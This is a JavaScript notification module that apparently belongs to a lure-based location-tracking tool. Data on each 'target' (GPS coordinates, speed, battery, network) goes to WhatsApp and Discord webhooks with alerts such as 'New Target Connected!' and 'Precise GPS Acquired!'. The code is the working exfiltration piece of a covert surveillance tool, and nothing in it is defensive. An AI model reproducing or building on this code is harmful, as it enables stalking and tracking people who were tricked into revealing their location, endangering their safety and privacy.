// Notification Service for WhatsApp & Discord Webhooks
const db = require("./db")

// Throttle map so we don't spam alerts on 4-second intervals
const lastNotified = {}

class Notifier {
    async sendTargetAlert(target, eventType = "update") {
        const settings = db.getSettings()
        const waPhone = settings.whatsappPhone
        const waApiKey = settings.whatsappApiKey
        const waWebhook = settings.whatsappWebhookUrl
        const discordWebhook = settings.discordWebhookUrl

        const hasWhatsApp = (waPhone && waApiKey) || waWebhook
        if (!hasWhatsApp && !discordWebhook) {
            return // No notifications configured
        }

        const now = Date.now()
        const lastTime = lastNotified[target.id] || 0
        const isImportant = eventType === "connect" || eventType === "gps_acquired" || eventType === "geofence_breach"

        // Rate limit regular position updates to at most once per 60 seconds per target
        if (!isImportant && (now - lastTime) < 60000) {
            return
        }
        lastNotified[target.id] = now

        const gmapsUrl = `https://www.google.com/maps?q=${target.lat},${target.lng}`
        const timeStr = new Date(target.lastSeen || now).toLocaleTimeString()
        const accuracyStr = target.accuracy ? `±${Math.round(target.accuracy)}m` : "Unknown"
        const speedStr = target.speed != null && target.speed > 0 ? `${(target.speed * 3.6).toFixed(1)} km/h` : "Stationary"
        const batteryStr = target.battery != null ? `${Math.round(target.battery)}%${target.charging ? ' ⚡' : ''}` : "N/A"
        const networkStr = target.network || "Unknown"
        const lureStr = target.lure || "Weather"

        let title = "📍 Target Location Update"
        if (eventType === "connect") title = "🚀 New Target Connected!"
        else if (eventType === "gps_acquired") title = "🎯 Precise GPS Acquired!"
        else if (eventType === "geofence_breach") title = "⚠️ GEOFENCE BREACH DETECTED!"

        // 1. Send WhatsApp Notification
        if (hasWhatsApp) {
            const waMessage = `*${title}*\n\n` +
                `👤 *Target ID:* ${target.id}\n` +
                `🎭 *Lure:* ${lureStr}\n` +
                `📡 *Signal:* ${target.type || 'GPS'} (${accuracyStr})\n` +
                `🏎️ *Speed:* ${speedStr}\n` +
                `🔋 *Battery:* ${batteryStr} | 📶 *Net:* ${networkStr}\n` +
                `🕒 *Time:* ${timeStr}\n\n` +
                `🗺️ *Google Maps:* \n${gmapsUrl}`

            // A) Send via CallMeBot WhatsApp API
            if (waPhone && waApiKey) {
                try {
                    const cleanPhone = waPhone.replace(/[^0-9]/g, "")
                    const encodedText = encodeURIComponent(waMessage)
                    const url = `https://api.callmebot.com/whatsapp.php?phone=${cleanPhone}&text=${encodedText}&apikey=${encodeURIComponent(waApiKey)}`

                    const res = await fetch(url)
                    if (!res.ok) {
                        console.warn("[WhatsApp CallMeBot Notice]:", res.status, res.statusText)
                    }
                } catch (err) {
                    console.warn("[WhatsApp Notifier Error]:", err.message)
                }
            }

            // B) Send via Custom WhatsApp Webhook / Gateway
            if (waWebhook && waWebhook.startsWith("http")) {
                try {
                    await fetch(waWebhook, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            phone: waPhone || "",
                            message: waMessage,
                            target,
                            gmapsUrl,
                            eventType
                        })
                    })
                } catch (err) {
                    console.warn("[WhatsApp Webhook Error]:", err.message)
                }
            }
        }

        // 2. Send Discord Webhook Notification
        if (discordWebhook && discordWebhook.startsWith("http")) {
            const embedColor = eventType === "geofence_breach" ? 0xef4444 : (eventType === "connect" ? 0x22c55e : 0x0284c7)
            const discordPayload = {
                username: "Live Location Tracker",
                avatar_url: "https://img.icons8.com/color/96/whatsapp--v1.png",
                embeds: [
                    {
                        title,
                        url: gmapsUrl,
                        color: embedColor,
                        fields: [
                            { name: "Target ID", value: `\`${target.id}\``, inline: true },
                            { name: "Template", value: lureStr, inline: true },
                            { name: "Coordinates", value: `${target.lat.toFixed(5)}, ${target.lng.toFixed(5)}`, inline: true },
                            { name: "Accuracy", value: accuracyStr, inline: true },
                            { name: "Speed", value: speedStr, inline: true },
                            { name: "Battery", value: batteryStr, inline: true },
                            { name: "Network", value: networkStr, inline: true },
                            { name: "Type", value: target.type || "GPS", inline: true },
                            { name: "Google Maps", value: `[View on Map](${gmapsUrl})`, inline: false }
                        ],
                        footer: { text: `Tracker Alert • ${timeStr}` }
                    }
                ]
            }

            try {
                await fetch(discordWebhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(discordPayload)
                })
            } catch (err) {
                console.warn("[Discord Notifier Error]:", err.message)
            }
        }
    }
}

module.exports = new Notifier()
